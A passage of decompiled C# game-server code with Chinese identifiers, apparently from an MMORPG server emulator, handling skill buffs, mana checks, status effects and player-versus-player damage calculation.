										foreach (Players value73 in value65.队员列表.Values)
										{
											if (查找范围玩家(400, value73))
											{
												if (value73.GetAddState(武功ID))
												{
													value73.追加状态列表[武功ID].时间结束事件();
												}
												if (value73.GetAddState(501401))
												{
													value73.追加状态列表[501401].时间结束事件();
												}
												追加状态类 value66 = new 追加状态类(value73, (int)num87, 武功ID, 0, num88);
												value73.追加状态列表.Add(武功ID, value66);
												value73.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num87);
												value73.FLD_追加百分比_命中 += num88;
												value73.更新武功和状态();
											}
										}
										发送医生群体辅助数据(人物ID, value65, 0, 武功ID, value4);
									}
									else
									{
										if (value3.追加状态列表 != null)
										{
											if (value3.GetAddState(武功ID))
											{
												value3.追加状态列表[武功ID].时间结束事件();
											}
											if (value3.GetAddState(501401))
											{
												value3.追加状态列表[501401].时间结束事件();
											}
										}
										追加状态类 value67 = new 追加状态类(value3, (int)num87, 武功ID, 0, num88);
										value3.追加状态列表.Add(武功ID, value67);
										value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num87);
										value3.FLD_追加百分比_命中 += num88;
										value3.更新武功和状态();
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									}
									魔法使用(value4.FLD_MP);
									升天四气功触发(null);
									更新HP_MP_SP();
								}
								break;
							case 501603:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									double num12 = 600000.0 + base.医_吸星大法;
									double num13 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num13 += base.医_九天真气;
									}
									组队Class value17;
									if (World.W组队.TryGetValue(组队id, out value17) && 人物ID == base.人物全服ID)
									{
										foreach (Players value74 in value17.队员列表.Values)
										{
											if (查找范围玩家(400, value74))
											{
												if (value74.追加状态列表 != null)
												{
													if (value74.GetAddState(武功ID))
													{
														value74.追加状态列表[武功ID].时间结束事件();
													}
													if (value74.GetAddState(501402))
													{
														value74.追加状态列表[501402].时间结束事件();
													}
												}
												追加状态类 value18 = new 追加状态类(value74, (int)num12, 武功ID, 0, num13);
												value74.追加状态列表.Add(武功ID, value18);
												value74.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num12);
												value74.FLD_人物_追加百分比_回避 += num13;
												value74.更新武功和状态();
											}
										}
										发送医生群体辅助数据(人物ID, value17, 0, 501603, value4);
									}
									else
									{
										if (value3.追加状态列表 != null)
										{
											if (value3.GetAddState(武功ID))
											{
												value3.追加状态列表[武功ID].时间结束事件();
											}
											if (value3.GetAddState(501402))
											{
												value3.追加状态列表[501402].时间结束事件();
											}
										}
										追加状态类 value19 = new 追加状态类(value3, (int)num12, 武功ID, 0, num13);
										value3.追加状态列表.Add(武功ID, value19);
										value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num12);
										value3.FLD_人物_追加百分比_回避 += num13;
										value3.更新武功和状态();
										发送攻击人物数据(this, 人物ID, 501603, 1, 0, value3.人物_HP, 0, -1);
									}
									魔法使用(value4.FLD_MP);
									升天四气功触发(null);
									更新HP_MP_SP();
								}
								break;
							case 601202:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.GetAddState(601202))
									{
										value3.追加状态列表[601202].时间结束事件();
									}
									追加状态类 value59 = new 追加状态类(value3, 1800000, 武功ID, 0);
									value3.追加状态列表.Add(武功ID, value59);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, 1800000);
									base.FLD_夫妻辅助_追加_武器_属性 = 1;
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									value3.计算人物装备数据();
									value3.更新武功和状态();
									魔法使用(value4.FLD_MP);
									更新HP_MP_SP();
								}
								break;
							case 4000101:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 3000401:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										更新HP_MP_SP();
									}
								}
								break;
							case 4000601:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4000501:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4000401:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4000801:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4000701:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4002101:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4000901:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4002401:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4002301:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 4002201:
								if (base.人物全服ID == 人物ID)
								{
									if (base.人物_MP < value4.FLD_MP)
									{
										魔法不足提示();
										发送激活技能数据(value4.FLD_PID, 2);
									}
									else
									{
										魔法使用(value4.FLD_MP);
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, base.人物_HP, 0, -1);
										if (base.人物_AP < base.人物最大_AP)
										{
											base.人物_AP += value4.FLD_AT;
										}
										更新HP_MP_SP();
									}
								}
								break;
							case 6002101:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(35))
									{
										value3.神女异常状态[35].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && (!value3.神女异常状态.ContainsKey(34) || !value3.神女异常状态.ContainsKey(35)) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										double num10 = value3.Player_Level * 2;
										神女异常状态类 value11 = new 神女异常状态类(value3, 60000, 34, 0.0, num10);
										value3.神女异常状态.Add(34, value11);
										value3.FLD_神女_追加_攻击 -= (int)num10;
										value3.FLD_神女_追加_防御 -= (int)num10;
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002102:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(34))
									{
										value3.神女异常状态[34].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && (!value3.神女异常状态.ContainsKey(34) || !value3.神女异常状态.ContainsKey(35)) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										double num8 = value3.Player_Level * 2;
										double num9 = value3.Player_Level;
										神女异常状态类 value9 = new 神女异常状态类(value3, 60000, 35, 0.0, num8);
										value3.神女异常状态.Add(35, value9);
										value3.FLD_神女_追加_攻击 -= (int)num8;
										value3.FLD_神女_追加_防御 -= (int)num8;
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										神女异常状态类 value10 = new 神女异常状态类(this, 60000, 52, 0.0, num9);
										神女异常状态.Add(52, value10);
										base.FLD_神女_追加_攻击 += (int)num9;
										base.FLD_神女_追加_防御 += (int)num9;
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002103:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !value3.神女异常状态.ContainsKey(36) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										神女异常状态类 value45 = new 神女异常状态类(value3, 60000, 36, 0.0, 0.0);
										value3.神女异常状态.Add(36, value45);
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002104:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									魔法使用(value4.FLD_MP);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 6002105:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									魔法使用(value4.FLD_MP);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 6002106:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !value3.神女异常状态.ContainsKey(39) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										神女异常状态类 value21 = new 神女异常状态类(value3, 6000, 39, 0.0, 0.0);
										value3.神女异常状态.Add(39, value21);
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										value3.超负荷等级 = 武功新[1, value4.FLD_INDEX].武功_等级;
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							default:
								if (base.人物坐标_地图 == 801)
								{
									if (World.势力战进程 != 0)
									{
										if (base.势力战派别 == value3.势力战派别)
										{
											break;
										}
									}
									else if (base.帮派名字 == value3.帮派名字)
									{
										break;
									}
								}
								if (base.人物PK模式 == 1)
								{
									if (World.势力战进程 != 0)
									{
										if (base.势力战派别 == value3.势力战派别)
										{
											break;
										}
									}
									else if (base.帮派名字 == value3.帮派名字)
									{
										break;
									}
								}
								if (value3.GM模式 != 8 && base.人物PK模式 != 0 && 人物ID != base.人物全服ID && !触发新手安全区(this) && !触发新手安全区(value3) && base.Player_Level >= 35 && value3.Player_Level >= 35 && (base.人物坐标_地图 != 7301 || !(base.帮派名字 == value3.帮派名字)) && (value4.FLD_ZX == 0 || base.Player_Zx == value4.FLD_ZX) && (base.Player_Job_leve >= value4.FLD_JOBLEVEL || base.Player_Job_leve >= value4.FLD_JOBLEVEL - 1))
								{
									float num19 = value3.人物坐标_X - base.人物坐标_X;
									float num20 = value3.人物坐标_Y - base.人物坐标_Y;
									double num21 = Math.Sqrt((double)num19 * (double)num19 + (double)num20 * (double)num20);
									switch (base.Player_Job)
									{
									default:
										if (num21 > World.其他职业PK距离)
										{
											return;
										}
										break;
									case 11:
										if (num21 > 70.0 + base.梅_玄武的指点)
										{
											return;
										}
										break;
									case 5:
										if (num21 > World.医生PK距离)
										{
											return;
										}
										break;
									case 4:
										if (num21 > World.弓箭手PK距离 + base.弓_猎鹰之眼)
										{
											return;
										}
										break;
									}
									if (base.人物坐标_地图 == 42101 && base.帮派名字 == value3.帮派名字)
									{
										系统提示("不能击杀本帮派成员。");
									}
									else
									{
										if (value3.人物坐标_地图 != 2301 && base.人物坐标_地图 != 2301 && base.人物坐标_地图 != 7301 && value3.人物坐标_地图 != 7301 && value3.人物坐标_地图 != 801 && base.人物坐标_地图 != 801)
										{
											if (value3.安全模式 == 1)
											{
												系统提示("对方处于安全模式中,禁止攻击。");
												break;
											}
											if (安全模式 == 1)
											{
												系统提示("处于安全模式中,禁止攻击。");
												break;
											}
										}
										if (value3.人物坐标_地图 == 2301 || base.人物坐标_地图 == 2301 || base.人物坐标_地图 == 7301 || value3.人物坐标_地图 == 7301 || value3.人物坐标_地图 == 801 || base.人物坐标_地图 == 801 || (!value3.GetAddState(1000000099) && !GetAddState(1000000099)))
										{
											if (base.人物坐标_地图 != 801 && base.人物坐标_地图 != 7301 && Math.Abs(base.Player_Level - value3.Player_Level) > World.PK等级差)
											{
												系统提示("等级差" + World.PK等级差 + "以上，不能攻击。");
											}
											else if (value3.Player无敌)
											{
												系统提示("对方刚刚复活,请慢点攻击。", 50, "系统提示");
											}
											else
											{
												if (value4.FLD_武功类型 == 3)
												{
													int num22 = value4.FLD_MP + (武功新[value4.FLD_武功类型, value4.FLD_INDEX].武功_等级 - 1) * value4.FLD_每级加MP;
													if (base.人物_MP < num22)
													{
														魔法不足提示();
														break;
													}
													魔法使用(num22);
												}
												else if (value4.FLD_武功类型 == 2)
												{
													if (base.人物_MP < base.夫妻武功攻击力MP)
													{
														魔法不足提示();
														break;
													}
													魔法使用(base.夫妻武功攻击力MP);
												}
												else
												{
													if (base.人物_MP < value4.FLD_MP)
													{
														魔法不足提示();
														PkID = 0;
														break;
													}
													魔法使用(value4.FLD_MP);
												}
												更新HP_MP_SP();
												if (!value3.检查毒蛇出洞状态() && value3.Player_Job == 12)
												{
													触发属性提升 = 0;
													if (value3.牢不可破 >= (double)RNG.Next(0, 100))
													{
														触发属性提升 = 1;
														value3.计算人物装备数据();
														value3.显示大字(value3.人物全服ID, 1010);
													}
												}
												if (base.陵劲淬砺 > 0.0)
												{
													触发属性提升 = 0;
													if (base.陵劲淬砺 >= (double)RNG.Next(1, 100))
													{
														触发属性提升 = 2;
														计算人物装备数据();
														显示大字(base.人物全服ID, 1011);
													}
												}
												double num23 = value3.FLD_人物基本_防御New;
												double num24 = base.FLD_人物基本_攻击;
												int num25 = 0;
												double num26 = num23 * (1.0 - base.FLD_装备_追加_降低百分比防御);
												if (!检查毒蛇出洞状态())
												{
													if (base.Player_Job == 1)
													{
														if ((double)RNG.Next(1, 110) <= base.破甲几率)
														{
															显示大字(base.人物全服ID, 16);
															num26 *= 得到气功加成值(1, 5, 1);
														}
													}
													else if (base.Player_Job == 2)
													{
														double num27 = RNG.Next(1, 100);
														double num28 = RNG.Next(1, 100);
														double num29 = 0.0;
														if (num28 <= base.剑_乘胜追击)
														{
															num27 -= base.剑_乘胜追击;
															num29 += base.剑_乘胜追击 * 0.1;
														}
														if (num27 <= base.剑_无坚不摧)
														{
															num26 *= 得到气功加成值(2, 9, 1) - num29;
															显示大字(base.人物全服ID, 120);
														}
													}
													else if (base.Player_Job == 8 && (double)RNG.Next(1, 110) <= base.破甲几率)
													{
														显示大字(base.人物全服ID, 16);
														num26 *= 得到气功加成值(8, 7, 1);
													}
												}
												if (!value3.检查毒蛇出洞状态())
												{
													if (value3.Player_Job == 3 && (double)RNG.Next(1, 100) <= value3.枪_转攻为守)
													{
														value3.显示大字(value3.人物全服ID, 130);
														num26 += (double)value3.FLD_攻击 * 0.2;
													}
													if (value3.Player_Job == 10 && (double)RNG.Next(1, 100) <= value3.拳师_转攻为守)
													{
														value3.显示大字(value3.人物全服ID, 130);
														num26 += (double)value3.FLD_攻击 * 0.2;
													}
													if (value3.Player_Job == 12 && (double)RNG.Next(1, 100) <= value3.卢_转攻为守)
													{
														value3.显示大字(value3.人物全服ID, 130);
														num26 += (double)value3.FLD_攻击 * 0.2;
													}
												}
												int num30 = 0;
												if (value4.FLD_武功类型 == 3)
												{
													num30 = value4.FLD_AT + (武功新[value4.FLD_武功类型, value4.FLD_INDEX].武功_等级 - 1) * value4.FLD_每级加危害;
												}
												else if (value4.FLD_武功类型 == 2)
												{
													num30 = base.夫妻武功攻击力;
												}
												else if (value4.FLD_每级危害.Length <= 0)
												{
													num30 = ((base.Player_Job != 10 || num6 == 0) ? ((value4.FLD_PID == 师傅数据.STWG1 || value4.FLD_PID == 师傅数据.STWG2 || value4.FLD_PID == 师傅数据.STWG2) ? (value4.FLD_AT * (10 - 师傅数据.STLEVEL) / 10) : ((value4.FLD_武功类型 != 2) ? 计算升天武功威力(value4) : base.夫妻武功攻击力)) : ((num6 != 0) ? ((int)((double)num30 * (1.0 + base.拳师_水火一体) + (double)(base.Player_Level * 5))) : ((int)((double)num30 * (1.0 + base.拳师_磨杵成针)))));
												}
												else
												{
													int at = value4.GetAt(value4.FLD_PID, 武功新[value4.FLD_武功类型, value4.FLD_INDEX].武功_等级);
													if (at > 0)
													{
														num30 = at;
													}
												}
												if (爆毒状态 > 0.0)
												{
													num30 += (int)((double)num30 * 爆毒状态);
													爆毒状态 = 0.0;
												}
												if (base.Player_Job == 11)
												{
													if (!检查毒蛇出洞状态())
													{
														if (base.梅_玄武危化 > 0.0)
														{
															num30 = (int)((double)num30 * (1.0 + base.梅_玄武危化));
														}
														if (怒点 >= 3)
														{
															怒点 = 0;
															if (base.梅_愤怒爆发 > 0.0)
															{
																num30 = (int)((double)num30 * (1.0 + base.梅_愤怒爆发));
																显示大字(base.人物全服ID, 802);
															}
															更新HP_MP_SP();
														}
													}
													int num31 = 0;
													int num32 = 0;
													if (base.人物坐标_地图 == 801)
													{
														num32 = 1;
													}
													else if (base.人物坐标_地图 == 7301)
													{
														num32 = 2;
													}
													foreach (Players value75 in PlayList.Values)
													{
														if (查找范围玩家(70 + (int)base.梅_玄武的指点, value75))
														{
															switch (num32)
															{
															case 0:
																if (Math.Abs(base.Player_Level - value75.Player_Level) <= World.PK等级差 && !触发新手安全区(value75) && value75.Player_Level >= 35 && value75.Player_Zx != base.Player_Zx)
																{
																	num31++;
																	if (num31 >= 5)
																	{
																		num31 = 5;
																	}
																}
																break;
															case 1:
																if (!Buffer.IsEquals(value75.势力战派别, base.势力战派别))
																{
																	num31++;
																}
																if (num31 >= 5)
																{
																	num31 = 5;
																}
																break;
															case 2:
																if (!Buffer.IsEquals(value75.帮派名字, base.帮派名字))
																{
																	num31++;
																}
																if (num31 >= 5)
																{
																	num31 = 5;
																}
																break;
															}
														}
													}
													if (num31 > 0)
													{
														num30 = (int)((double)num30 * (1.0 + base.梅_升天三气功_杀人鬼 * (double)num31));
													}
												}
												double num33 = (int)((value3.FLD_装备_武功防御力 + (double)value3.人物_气功_追加_武功防御力) * (1.0 + value3.FLD_人物_武功防御力增加百分比 + value3.FLD_人物_气功_武功防御力增加百分比));
												double num34 = (num24 - num26) * 1.5 + (double)num30 * (1.0 + base.FLD_装备_武功攻击力增加百分比 + base.FLD_人物_武功攻击力增加百分比 + base.FLD_人物_气功_武功攻击力增加百分比) - num33 * 0.5 + (double)(base.FLD_人物基本_命中 / 4) - (double)(value3.FLD_人物基本_回避 / 4) + (double)(base.人物_追加_PVP战力 * 15);
												if (num34 <= 0.0)
												{
													double num35 = (base.FLD_装备_追加_伤害值 < 0) ? 0.0 : ((double)base.FLD_装备_追加_伤害值);
													if (num35 <= 1.0)
													{
														num35 = RNG.Next(1, 5);
													}
													if (value3.Player_Job == 11)
													{
														if (value3.梅_障力激活 > 0.0)
														{
															num25 = (int)(num35 * (value3.梅_障力激活 * 0.01));
															if (num25 > value3.人物_AP)
															{
																num25 = value3.人物_AP;
															}
															value3.人物_AP -= num25;
														}
													}
													else
													{
														num25 = 0;
													}
													double num36 = num35 - (double)num25;
													if (num36 <= 1.0)
													{
														num36 = 1.0;
													}
													攻击计算完成(this, 人物ID, 武功ID, (int)num36, 0, 0, num25);
												}
												else
												{
													if (!检查毒蛇出洞状态())
													{
														if (base.Player_Job == 1)
														{
															if ((double)RNG.Next(1, 100) <= base.真武绝击)
															{
																显示大字(base.人物全服ID, 17);
																num34 *= 得到气功加成值(1, 7, 1);
															}
															if ((double)RNG.Next(1, 100) <= base.暗影绝杀)
															{
																显示大字(base.人物全服ID, 18);
																num34 *= 得到气功加成值(1, 9, 1);
															}
															if ((double)RNG.Next(1, 100) <= base.刀_梵音破镜 + base.升天五式_龙魂附体)
															{
																显示大字(base.人物全服ID, 312);
																double num37 = 得到气功加成值(1, 10, 1);
																if (base.刀_升天三气功_火龙之火 > 0.0)
																{
																	num37 += base.刀_升天三气功_火龙之火;
																}
																num34 *= 1.0 + num37;
															}
														}
														else if (base.Player_Job == 2)
														{
															if ((double)RNG.Next(1, 110) <= base.剑_怒海狂澜)
															{
																num34 *= 得到气功加成值(2, 7, 1);
															}
															if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 >= 1)
															{
																显示大字(base.人物全服ID, 321);
																num34 += (double)天地同寿回避累积攻击力;
																天地同寿回避累积攻击力 = 0;
																天地同寿回避次数 = 0;
															}
															if ((double)RNG.Next(1, 100) <= base.升天五式_惊天动地)
															{
																num34 *= 1.35;
																显示大字(base.人物全服ID, 1015);
															}
														}
														else if (base.Player_Job == 3)
														{
															double num38 = 0.4;
															double num39 = base.枪_升天一气功_破甲刺魂;
															double num40 = RNG.Next(1, 100);
															if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5)
															{
																if (怒)
																{
																	num39 += base.枪_升天二气功_以退为进;
																	num38 += base.枪_升天二气功_以退为进 * 0.01;
																}
																if (num40 <= num39)
																{
																	num34 += (double)base.FLD_装备_追加_防御New * num38;
																	显示大字(base.人物全服ID, 330);
																}
															}
															if ((double)RNG.Next(1, 100) <= base.枪_怒意之吼)
															{
																double num41 = 得到气功加成值(3, 10, 1);
																显示大字(base.人物全服ID, 332);
																if (怒)
																{
																	num41 += base.枪_升天三气功_怒意之火;
																}
																num34 *= 1.0 + num41;
															}
															if (!怒 && (double)RNG.Next(1, 100) <= base.升天五式_灭世狂舞)
															{
																num34 *= 1.2;
																显示大字(base.人物全服ID, 1016);
															}
														}
														else if (base.Player_Job == 4)
														{
															num34 += base.弓_锐利之箭 + 1.0;
															if ((double)RNG.Next(1, 100) <= base.弓_无明暗矢)
															{
																num34 *= 1.05 + base.弓_无明暗矢 * 0.01;
																显示大字(base.人物全服ID, 49);
															}
															if ((double)RNG.Next(1, 100) <= base.弓_升天三气功_天外三矢)
															{
																显示大字(base.人物全服ID, 342);
																if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && (double)RNG.Next(1, 100) <= base.弓_升天一气功_绝影射魂)
																{
																	显示大字(base.人物全服ID, 340);
																	num34 *= 1.25;
																}
															}
															if (value4.FLD_TYPE == 4)
															{
																int num42 = RNG.Next(1, 110);
																int num43 = RNG.Next(1, 120);
																if ((double)num42 <= base.弓_心神凝聚)
																{
																	base.弓群攻触发心神 = true;
																	num34 *= 1.65;
																}
																else if ((double)num43 <= base.弓_致命绝杀)
																{
																	double num44 = base.弓_致命绝杀 * 得到气功加成值(4, 11, 1);
																	num34 *= 1.0 + num44 / 2.5;
																	显示大字(base.人物全服ID, 140);
																}
															}
															if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
															{
																num34 *= 1.0 + base.升天五式_千里一击 * 2.0 / 100.0;
																显示大字(base.人物全服ID, 1017);
															}
														}
														else if (base.Player_Job == 5)
														{
															num34 *= 1.0 + base.医_长攻击力;
															if ((double)RNG.Next(1, 100) <= base.真武绝击)
															{
																显示大字(base.人物全服ID, 17);
																num34 *= 得到气功加成值(5, 7, 1);
															}
															double num45 = (base.医_无中生有 - base.医_狂意护体) * 0.01;
															if ((double)RNG.Next(1, 100) <= base.医_无中生有)
															{
																显示大字(base.人物全服ID, 351);
																if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && (double)RNG.Next(1, 100) <= base.医_升天三气功_明镜止水)
																{
																	显示大字(base.人物全服ID, 352);
																	num45 *= 2.0;
																}
																if (num45 > 0.0)
																{
																	num34 += (double)(int)(num34 * num45);
																}
															}
														}
														else if (base.Player_Job == 6)
														{
															if (value4.FLD_PID == 801303)
															{
																if ((int)DateTime.Now.Subtract(Pktime801303).TotalSeconds < 30)
																{
																	break;
																}
																Pktime801303 = DateTime.Now;
																num34 = 0.0;
																怒气++;
																if (怒气 > 5)
																{
																	怒气 = 5;
																}
															}
															else if (value4.FLD_INDEX != 1 && value4.FLD_INDEX != 5 && value4.FLD_INDEX != 9 && value4.FLD_INDEX != 13 && value4.FLD_INDEX != 17 && value4.FLD_INDEX != 21 && value4.FLD_INDEX != 25)
															{
																if (value4.FLD_INDEX != 2 && value4.FLD_INDEX != 6 && value4.FLD_INDEX != 10 && value4.FLD_INDEX != 14 && value4.FLD_INDEX != 18 && value4.FLD_INDEX != 22 && value4.FLD_INDEX != 26)
																{
																	if ((value4.FLD_INDEX == 3 || value4.FLD_INDEX == 7 || value4.FLD_INDEX == 11 || value4.FLD_INDEX == 15 || value4.FLD_INDEX == 19 || value4.FLD_INDEX == 23 || value4.FLD_INDEX == 27) && 怒气 > 0)
																	{
																		num34 += num34 * 0.3 * (double)怒气;
																		显示大字(base.人物全服ID, 80);
																		怒气 = 0;
																	}
																}
																else if (怒气 > 0)
																{
																	if (!value3.GetAbnormalState(9) && RNG.Next(1, 100) <= 35)
																	{
																		double num46 = 10000.0 + base.刺_千蛛万手;
																		异常状态类 value26 = new 异常状态类(value3, (int)num46, 9, 0.0);
																		value3.异常状态.Add(9, value26);
																		value3.delFLD_追加百分比_防御(0.07);
																		value3.更新武功和状态();
																	}
																	double num47 = 0.005;
																	switch (value4.FLD_INDEX)
																	{
																	case 10:
																		num47 = 0.009;
																		break;
																	case 6:
																		num47 = 0.007;
																		break;
																	case 2:
																		num47 = 0.005;
																		break;
																	case 18:
																		num47 = 0.013;
																		break;
																	case 14:
																		num47 = 0.011;
																		break;
																	case 26:
																		num47 = 0.02;
																		break;
																	case 22:
																		num47 = 0.015;
																		break;
																	}
																	if (!value3.GetAbnormalState(10))
																	{
																		double num48 = 10000.0 + base.刺_千蛛万手;
																		异常状态类 异常状态类 = new 异常状态类(value3, (int)num48, 10, (int)(num34 * num47));
																		value3.异常状态.Add(10, 异常状态类);
																		异常状态类.异常状态类出血(num34 * num47);
																	}
																	怒气--;
																}
															}
